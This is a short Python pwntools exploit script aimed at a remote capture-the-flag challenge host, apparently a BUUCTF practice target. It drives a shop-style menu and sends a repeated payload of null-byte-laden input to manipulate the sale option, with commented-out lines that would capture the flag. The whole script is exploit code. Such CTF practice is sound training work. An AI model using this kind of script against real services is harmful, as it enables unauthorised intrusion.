from pwn import *
# context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

def look():
    p.sendlineafter("> ",str(1))
def bug(id):
    p.sendlineafter("> ",str(2))
    p.sendlineafter("> ",str(id))
def sale(id):
    p.sendlineafter("> ",str(3))
    p.sendlineafter("> ",str(id))

# p = process("./pwn")
p = remote("node4.buuoj.cn",29552)


# for i in range(20):
#     sale(00)

payload = '3\x00\n00\x00\n'
payload = payload*10
p.sendlineafter("> ",payload)


# bug(1)
# look()
# look()

# p.recvuntil("flag{")
# flag = "flag{"+p.recvuntil('}')
# log.success("flag: "+flag)

p.interactive()